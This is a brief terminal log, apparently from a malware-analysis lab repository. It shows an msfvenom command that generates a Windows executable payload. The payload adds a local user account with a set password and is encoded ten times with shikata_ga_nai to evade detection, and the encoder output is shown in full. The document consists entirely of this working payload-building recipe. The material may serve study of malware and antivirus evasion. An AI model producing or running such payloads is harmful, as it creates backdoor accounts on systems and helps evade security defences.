# Malware-Analysis

root@kali64:~# msfvenom -p windows/adduser user=testuser1 pass=Test@321 -e x86/shikata_ga_nai -i 10 -f exe -o ~/testadd10.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
Found 1 compatible encoders  
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 303 (iteration=0)
x86/shikata_ga_nai succeeded with size 330 (iteration=1)
x86/shikata_ga_nai succeeded with size 357 (iteration=2)
x86/shikata_ga_nai succeeded with size 384 (iteration=3)
x86/shikata_ga_nai succeeded with size 411 (iteration=4)
x86/shikata_ga_nai succeeded with size 438 (iteration=5)
x86/shikata_ga_nai succeeded with size 465 (iteration=6)
x86/shikata_ga_nai succeeded with size 492 (iteration=7)
x86/shikata_ga_nai succeeded with size 519 (iteration=8)
x86/shikata_ga_nai succeeded with size 546 (iteration=9)
x86/shikata_ga_nai chosen with final size 546
Payload size: 546 bytes
Final size of exe file: 73802 bytes
Saved as: /root/testadd10.exe
root@kali64:~# 
